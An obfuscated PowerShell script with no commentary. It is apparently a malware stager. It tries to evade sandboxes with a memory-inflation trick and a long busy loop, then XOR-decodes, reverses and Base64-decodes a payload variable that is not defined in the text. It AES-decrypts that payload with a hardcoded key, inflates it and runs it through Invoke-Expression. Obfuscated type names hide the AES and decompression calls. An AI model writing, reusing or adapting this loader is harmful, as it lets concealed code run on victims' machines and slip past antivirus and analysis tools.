$usrhtoktzzxrzq = (Get-Process -Id $PID | Select-Object Name,@{Name="WorkingSet";Expression={($_.ws / 1024kb)}}).WorkingSet
if ($usrhtoktzzxrzq -lt 250) { $yqijxgyqgqr = "a" * 300MB }
$kjosghyvwrvpkvp = 0
$jzvykgkzkxgx = 30000000
For ($kjosghyvwrvpkvp=0; $kjosghyvwrvpkvp -lt $jzvykgkzkxgx;$kjosghyvwrvpkvp++) { $kjosghyvwrvpkvp++ }
$gvvpvsrjvhrwooyio = [System.Text.Encoding]::UTF8.GetBytes("ypqsqixxjzgivzs")
$qvghxuvgxunwgirmx = [System.Text.Encoding]::UTF8.GetBytes($vivuhnvgnr)
$jsozopjjrtyughogz = $(for ($uyqsrzptxzthph = 0; $uyqsrzptxzthph -lt $qvghxuvgxunwgirmx.length; ) {
    for ($gxjozukzmy = 0; $gxjozukzmy -lt $gvvpvsrjvhrwooyio.length; $gxjozukzmy++) {
        $qvghxuvgxunwgirmx[$uyqsrzptxzthph] -bxor $gvvpvsrjvhrwooyio[$gxjozukzmy]
        $uyqsrzptxzthph++
        if ($uyqsrzptxzthph -ge $qvghxuvgxunwgirmx.Length) {
            $gxjozukzmy = $gvvpvsrjvhrwooyio.length
        }
    }
})
$jsozopjjrtyughogz = [System.Text.Encoding]::UTF8.GetString($jsozopjjrtyughogz)
$xjttqxuxrthmyquvs = "$jsozopjjrtyughogz"
$omhvrohzygg = $xjttqxuxrthmyquvs.ToCharArray()
[array]::Reverse($omhvrohzygg)
$xgjggqgjgkvrnkrw = -join($omhvrohzygg)
$itokjstopixt = [System.Convert]::FromBase64String("$xgjggqgjgkvrnkrw")
$ktnnhtuihqqwqxhws = [System.Convert]::FromBase64String("pRTMzXIsqDLdXhtg4tBBHeadYHglaHIHJ39p8DOil6c=")
$gtyyuonmkqt = "==gCkV2Zh5WYNNXZB5SeoBXYyd2b0BXeyNkL5RXayV3YlNlLtVGdzl3U"
$kpvmiiwprgiztss = $gtyyuonmkqt.ToCharArray()
[array]::Reverse($kpvmiiwprgiztss)
$pgzjsmpuizvt = -join($kpvmiiwprgiztss)
$sxnpqtmxykn = [System.Text.Encoding]::UTF8.GetString([System.Convert]::FromBase64String($pgzjsmpuizvt))
$wqipzypwqrtzhisg = New-Object "$sxnpqtmxykn"
$mhvvnjwookrrggxsy = "==gQDVkO60VZk9WTyVGawl2QukHawFmcn9GdwlncD5Se0lmc1NWZT5SblR3c5N1W"
$xponwviwpgztvtvp = $mhvvnjwookrrggxsy.ToCharArray()
[array]::Reverse($xponwviwpgztvtvp)
$stugosxgjhp = -join($xponwviwpgztvtvp)
$hvinzovogynotvn = [System.Text.Encoding]::UTF8.GetString([System.Convert]::FromBase64String($stugosxgjhp))
$zsmumqtjvw = & ([scriptblock]::Create($hvinzovogynotvn))
$wqipzypwqrtzhisg.Mode = $zsmumqtjvw
$mkrypohmqtiroin = "==wNTN0SQpjOdVGZv10ZulGZkFGUukHawFmcn9GdwlncD5Se0lmc1NWZT5SblR3c5N1W"
$wzsngwnuqytjyu = $mkrypohmqtiroin.ToCharArray()
[array]::Reverse($wzsngwnuqytjyu)
$isnsggshgwqp = -join($wzsngwnuqytjyu)
$uyjwwoxswpn = [System.Text.Encoding]::UTF8.GetString([System.Convert]::FromBase64String($isnsggshgwqp))
$uuqpjsshvrogn = & ([scriptblock]::Create($uyjwwoxswpn))
$wqipzypwqrtzhisg.Padding = $uuqpjsshvrogn
$wqipzypwqrtzhisg.BlockSize = 128
$wqipzypwqrtzhisg.KeySize = 128
$wqipzypwqrtzhisg.Key = $ktnnhtuihqqwqxhws
$wqipzypwqrtzhisg.IV = $itokjstopixt[0..15]
$mghquonyzywzhzqjh = [System.Text.Encoding]::UTF8.GetString([System.Convert]::FromBase64String("U3lzdGVtLklPLk1lbW9yeVN0cmVhbQ=="))
$qjwqwtihknwshmy = New-Object $mghquonyzywzhzqjh(,$wqipzypwqrtzhisg.CreateDecryptor().TransformFinalBlock($itokjstopixt,16,$itokjstopixt.Length-16))
$vzpmqttqwygvqnxj = New-Object $mghquonyzywzhzqjh
$yjhkhswntrvri = [System.Text.Encoding]::UTF8.GetString([System.Convert]::FromBase64String("RGVjb21wcmVzcw=="))
$vinnrrvzhxwwowq = & ([scriptblock]::Create([System.Text.Encoding]::UTF8.GetString([System.Convert]::FromBase64String("W0lPLkNvbXByZXNzaW9uLkNvbXByZXNzaW9uTW9kZV0="))))
$wtyrnkhvnwiroqq = [System.Text.Encoding]::UTF8.GetString([System.Convert]::FromBase64String("U3lzdGVtLklPLkNvbXByZXNzaW9uLkRlZmxhdGVTdHJlYW0="))
$xjhvmryskmpstpn = New-Object $wtyrnkhvnwiroqq $qjwqwtihknwshmy, ($vinnrrvzhxwwowq::$yjhkhswntrvri)
$xjhvmryskmpstpn.CopyTo($vzpmqttqwygvqnxj)
$xjhvmryskmpstpn.Close()
$wqipzypwqrtzhisg.Dispose()
$qjwqwtihknwshmy.Close()
$kyhzppzpvgkphy = & ([scriptblock]::Create([System.Text.Encoding]::UTF8.GetString([System.Convert]::FromBase64String("W1N5c3RlbS5UZXh0LkVuY29kaW5nXQ=="))))
$yorqpikwxppuy = [System.Text.Encoding]::UTF8.GetString([System.Convert]::FromBase64String("VVRGOA=="))
$rkgqmixzyzt = [System.Text.Encoding]::UTF8.GetString([System.Convert]::FromBase64String("VG9BcnJheQ=="))
$nuwuutrygxtwixs = [System.Text.Encoding]::UTF8.GetString([System.Convert]::FromBase64String("R2V0U3RyaW5n"))
$krvrugyjpgztpqs = $kyhzppzpvgkphy::$yorqpikwxppuy.$nuwuutrygxtwixs($vzpmqttqwygvqnxj.$rkgqmixzyzt())
Invoke-Expression($krvrugyjpgztpqs)